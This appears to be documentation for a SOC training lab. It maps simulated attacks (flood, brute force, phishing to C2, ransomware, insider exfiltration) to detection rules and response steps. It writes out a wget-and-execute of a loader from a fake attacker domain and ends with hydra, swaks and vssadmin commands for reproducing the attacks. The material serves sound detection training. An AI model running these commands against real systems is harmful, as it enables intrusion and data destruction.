# 11 — Attack scenarios

Every scenario is implemented in `scenarios/generator.py` and produces native-format
log lines. `data/logs/manifest.json` records the expected detections, which the test
suite enforces.

## Scenario map

| Day | Scenario | Attacker | Target | MITRE techniques | Expected rules | Incident |
|---|---|---|---|---|---|---|
| Oct 19–25 | Baseline business activity | — | — | — | none | — (control) |
| Oct 20 | HTTP flood | 203.0.113.199 | web-srv-02 | T1498.001 | DET-012 | INC-0001 |
| Oct 20 | Credential stuffing | 203.0.113.120 | /login | T1110.004 | DET-013 | INC-0002 |
| Oct 21 | Port scan | 198.51.100.23 | 10.10.0.0/16 | T1046 | DET-010 | INC-0003 |
| Oct 21 | Web exploitation attempts | 198.51.100.23 | web-srv-02 | T1190 | DET-011 | INC-0004 |
| Oct 22 | SSH brute force → root compromise | 203.0.113.44 | web-srv-02 | T1110.001, T1078.003, T1136.001, T1105 | DET-001, DET-002, DET-035, DET-036, ANO-002 | INC-0005 |
| Oct 23 | Phishing → macro → PowerShell → C2 | secure-auth-portal.com, 192.0.2.77 | ws-fin-14 (j.patel) | T1566.001, T1204.002, T1059.001, T1053.005, T1547.001, T1071.001, T1003.001 | DET-020…027, ANO-003 | INC-0006 |
| Oct 24 | Lateral movement → ransomware | ws-fin-14 | fs01, dc01, db01 | T1021.002, T1490, T1486, T1543.003, T1070.001 | DET-030…DET-039, DET-033 | INC-0006 |
| Oct 25 | Insider exfiltration | m.singh | fs01 → data-share-cloud.net | T1078, T1530, T1567, T1041 | DET-034, DET-037, DET-038, ANO-001 | INC-0007 |
| Oct 25 | RDP password spray | 203.0.113.44 | jump-01 | T1110.003 | DET-003, ANO-002 | INC-0008 |

---

## 1. HTTP flood and credential stuffing (Oct 20)

**Attack.** 330 GET requests in five minutes from `203.0.113.199` against `/`, then 60
POST attempts against `/login` from `203.0.113.120`.

**Telemetry.** nginx combined log with 503/200 responses and 401s.

**Detection.** DET-012 fires at 300 requests / 5 minutes; DET-013 at 40 failed logins /
10 minutes. Both group by `source.ip`, so the flood produces exactly one alert, not 300.

**Response.** Edge rate limiting, IP block, credential-stuffing monitoring.

**What it teaches.** Thresholds plus grouping are what keep a flood from flooding the
SIEM itself.

---

## 2. Reconnaissance and exploitation attempts (Oct 21)

**Attack.** 60 firewall denials from `198.51.100.23` across 15 ports on four hosts,
then eight HTTP requests carrying traversal, SQL injection, Log4Shell and XSS payloads,
then six SSH probes (deliberately below the brute-force threshold).

**Detection.** DET-010 requires 20 denials **and** 10 distinct ports; DET-011 matches
the payload signatures. The six SSH failures correctly produce no alert — the
threshold-respecting control case.

**What it teaches.** Distinct-count logic distinguishes scanning from retries, and
sequence context links recon to exploitation attempts (the two cases are
cross-referenced in the register).

---

## 3. SSH brute force to root compromise (Oct 22)

**Attack timeline**

| Time | Activity |
|---|---|
| 03:00–03:11 | 12 failed SSH logins across root/admin/test/oracle/deploy/ubuntu |
| 03:14 | Successful login as `deploy` from the same IP |
| 03:16 | `sudo wget http://cdn-update-sync.com/ldr.sh -O /tmp/.x` |
| 03:17 | `sudo bash /tmp/.x` |
| 03:18 | `sudo useradd -m -s /bin/bash svcmon` |
| 03:19 | `svcmon` added to the sudo group |
| 03:21 | Cron job curl-piping a beacon every 10 minutes |

**Detection.** DET-001 at the 8th failure; DET-002 (sequence) when the success follows;
ANO-002 independently flags the hourly spike; DET-035 catches the new account;
DET-036 catches the privileged download. Five rules across three data sources
correlate into one Critical case — the best demonstration in the lab of why
correlation beats individual alerts.

**Response.** Block source IP, reset the service account, remove `svcmon` and the cron
entry, rotate SSH keys, disable password authentication.

---

## 4. Phishing to command and control (Oct 23)

**Attack timeline**

| Time | Activity |
|---|---|
| 09:12 | Email from `billing@secure-auth-portal.com`, subject "Invoice_Oct2026.zip", IOC attachment |
| 09:31 | Outlook writes the attachment to Downloads |
| 09:33 | WINWORD opens `Invoice.docm` |
| 09:34 | WINWORD spawns `powershell.exe -nop -w hidden -enc …` |
| 09:35 | DNS query for `cdn-update-sync.com` (IOC), TLS to 192.0.2.88 |
| 09:36 | Payload `invoice_2026.exe` written with an IOC hash |
| 09:37 | Payload executed (novel process on the host) |
| 09:38 | Run-key persistence written |
| 09:40 | Scheduled task created running as SYSTEM |
| 10:30 | `rundll32` accesses LSASS (credential dumping) |
| 10:45–11:25 | Nine C2 beacons to `192.0.2.77:8443` |
| 09:44–10:30 | 55 proxy denials to the C2 domain (DET-040) |

**Detection.** DET-020 → 021 → 022 → 026 → 027 → 025 → 024 → 023 → 040; ANO-003 flags
the novel binary. All merge into one campaign with the ransomware of the next day.

**Why this matters.** The email alone is High; the process ancestry alone is Critical;
together with endpoint, DNS and proxy telemetry they reconstruct the intrusion.

---

## 5. Lateral movement and ransomware (Oct 24)

**Attack.** From the compromised workstation, network logons to `fs01`, `dc01` and
`db01` within one minute (02:10), `vssadmin delete shadows /all /quiet` (02:15), 120
files renamed `.locked` in six minutes (02:16–02:22), a service installed from
`C:\Windows\Temp\svc.exe` (02:22), the encryptor executed (02:23), and the security
log cleared (02:40).

**Detection.** DET-033 (3 hosts in 10 minutes), DET-030, DET-031 (100 files), DET-032,
DET-027 (ransomware hash), DET-039 (log cleared), ANO-003 (`svc.exe` novel).

**Response.** Segment isolation, account disablement, immutable backup restore,
forensic report, regulator assessment.

**What it teaches.** The highest-value detections fire *before* encryption:
shadow-copy deletion and multi-host logons give the SOC minutes-to-hours of warning.

---

## 6. Insider data exfiltration (Oct 25)

**Attack.** `m.singh` logs on at 00:40, reaches the HR share over SMB at 00:52,
`robocopy` collects salary data at 01:02, then three POST uploads (4.2 GB, 1.2 GB,
0.9 GB) to `data-share-cloud.net`.

**Detection.** DET-034 (off-hours network logon to a Confidential file server),
DET-037 (bulk upload), DET-038 (known exfiltration domain), ANO-001 (outbound volume
anomaly: 4.1 GB versus a 311 KB median).

**Response.** Block destination, isolate host, suspend account, HR/legal coordination,
regulatory assessment.

**What it teaches.** No malware is involved; behavioural baselines, asset
classification and threat intelligence are the only signals.

---

## 7. RDP password spray (Oct 25)

Twelve 4625 events from `203.0.113.44` against `jump-01` in twelve minutes. DET-003
fires at ten; ANO-002 confirms the spike. No successful logon — a failed attack that
still needs triage because the same IP already compromised a server three days earlier
(the cases are linked by shared origin).

---

## Reproducing a scenario on the real VMs

```bash
# Scenario 1 — HTTP flood (Kali)
hey -z 5m -q 70 -c 20 http://10.10.0.40/

# Scenario 3 — SSH brute force
hydra -L users.txt -P rockyou.txt ssh://10.10.0.40 -t 4 -f

# Scenario 4 — phishing (lab mail server, no real addresses)
swaks --to j.patel@corp.local --from billing@secure-auth-portal.com \
      --header "Subject: Invoice_Oct2026.zip" --attach Invoice_Oct2026.zip

# Scenario 5 — lateral movement (after obtaining credentials)
net use \\fs01\C$ /user:CORP\j.patel <password>
vssadmin delete shadows /all /quiet

# Scenario 7 — RDP spray
hydra -l administrator -P passwords.txt rdp://10.10.0.50
```

Each scenario should be run inside the isolated host-only network, with VMs snapshotted
first, and only against systems you own.
